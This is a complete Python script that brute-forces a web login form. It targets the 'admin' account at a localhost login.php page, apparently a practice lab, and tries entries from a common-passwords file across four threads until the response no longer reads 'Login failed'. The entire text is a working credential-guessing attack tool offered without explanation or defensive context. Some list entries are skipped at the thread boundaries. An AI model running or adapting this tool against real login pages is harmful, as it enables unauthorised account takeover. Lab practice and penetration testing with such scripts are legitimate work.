#!/usr/bin/env python3

import threading
import requests
from colorama import init, Fore

URL = 'http://localhost/login.php'
PASSWORD_FILE_NAME = 'common-passwords.txt'
entry_found = False


def create_threads(passwords):
    password_list_split_points = [
        (0, len(passwords) // 4),
        (len(passwords) // 4 + 1, len(passwords) // 2),
        (len(passwords) // 2 + 1, 3 * (len(passwords) // 4)),
        (3 * (len(passwords) // 4) + 1, len(passwords) - 1),
    ]
    thread_list = [threading.Thread(
        target=run_cracker,
        args=(
            passwords[split_point[0] : split_point[1]]
        )
    ) for split_point in password_list_split_points]
    return thread_list


def run_cracker(*passwords):
    global entry_found
    for password in passwords:
        if entry_found:
            break
        # Passwords still contain last \n char which has to be stripped.
        if crack_password(password.rstrip()):
            # This is set to True only once. No need for sync mechanisms.
            entry_found = True


def crack_password(password):
    print(Fore.BLUE + '[*] Trying password: "{}" ...'.format(password))
    response = requests.post(
        URL,
        data={'username': 'admin', 'Login': 'Login', 'password': password}
    )

    if bytes('Login failed', encoding='utf-8') not in response.content:
        print(Fore.GREEN + '[*] Login successful for username: {} password: {}'.format(
            'admin', password
        ))
        return True
    else:
        return False


if __name__ == '__main__':
    init()
    with open(PASSWORD_FILE_NAME) as password_file:
        passwords = password_file.readlines()

    thread_list = create_threads(passwords)

    for thread in thread_list:
        print(Fore.RED + '[*] Running thread: {}.'.format(thread.getName()))
        thread.start()

    for thread in thread_list:
        print(Fore.RED + '[*] Wating for {} to join.'.format(thread.getName()))
        thread.join()
